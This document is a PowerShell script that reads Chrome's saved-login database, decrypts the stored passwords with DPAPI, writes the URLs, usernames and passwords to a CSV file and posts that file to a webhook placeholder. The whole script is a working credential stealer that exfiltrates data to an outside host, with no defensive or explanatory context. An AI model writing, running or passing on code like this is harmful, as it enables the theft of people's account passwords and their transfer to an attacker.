#Set path to Chrome data
$chromeDataPath = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default\Login Data"

#Connect to Chrome data file
$connection = New-Object System.Data.SQLite.SQLiteConnection
$connection.ConnectionString = "Data Source=$chromeDataPath"
$connection.Open()

#Create command to select all rows from 'logins' table where 'blacklisted_by_user' is 0
$command = $connection.CreateCommand()
$command.CommandText = "SELECT action_url, username_value, password_value FROM logins WHERE blacklisted_by_user=0"

#Execute command and store results
$result = $command.ExecuteReader()

#Initialize empty array to store decrypted passwords
$passwords = @()

#Iterate through each row in results
while($result.Read()) {
# Get website URL, username, and encrypted password from row
$website = $result.GetString(0)
$username = $result.GetString(1)
$encryptedPassword = $result.GetValue(2)

# Try to decrypt password
try {
    # Use CryptUnprotectData to decrypt password
    $decryptedPassword = [Security.Cryptography.ProtectedData]::Unprotect($encryptedPassword, $null, 0)
} catch {
    # If decryption fails, skip this password
    continue
}

# Create object to store decrypted password
$passwordData = [PsCustomObject]@{
    Website = $website
    Username = $username
    Password = $decryptedPassword
}

# Add decrypted password object to array
$passwords += $passwordData
}

#Close connection to Chrome data file
$connection.Close()

#Print decrypted passwords
$passwords | Format-Table

#Save decrypted passwords to file
$passwords | Export-Csv -Path "C:\chrome_passwords.csv" -NoTypeInformation

#Set webhook URL
$webhookURL = "<WEBHOOK>"

#Set path to decrypted file
$filePath = "C:\chrome_passwords.csv"

#Read content of decrypted file
$fileContent = Get-Content -Path $filePath -Encoding ASCII

# Send decrypted file to webhook
Invoke-WebRequest -Method Post -Uri $webhookURL -Body $fileContent
